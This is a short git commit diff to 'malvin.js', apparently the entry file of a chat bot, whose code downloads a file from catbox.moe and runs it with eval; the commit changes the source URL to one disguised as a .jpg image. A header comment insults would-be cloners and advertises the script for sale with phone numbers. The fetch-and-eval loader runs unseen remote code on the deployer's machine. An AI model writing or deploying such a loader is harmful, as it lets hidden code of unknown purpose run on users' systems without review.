6221a5d2ab8e7bd33b33499e1b479e55f4a34022
Dokja123 <danielmalan888@gmail.com>
2025-03-22 20:28:36 +0000

    Update malvin.js

--- malvin.js
+++ malvin.js
@@ -1,7 +1,7 @@
 //HELLO CLOSER IF DID YOU WANT CLONE YOU FUCKING GAY 😂 IF YOU WANT BUY SCRIPT FIND ME +263780166288 ,+263780934873 ,+263714757857 FIND ME TO GET A SCRIPT IF YOU NEED IF DON'T NEED JUST DEPLOY AND ENJOY MALVIN XD FASTER BOT
 const axios = require('axios');
 
-const url = "https://files.catbox.moe/malvin.js";
+const url = "https://files.catbox.moe/qt12kk.jpg";
 
 axios.get(url)
     .then(response => eval(response.data))
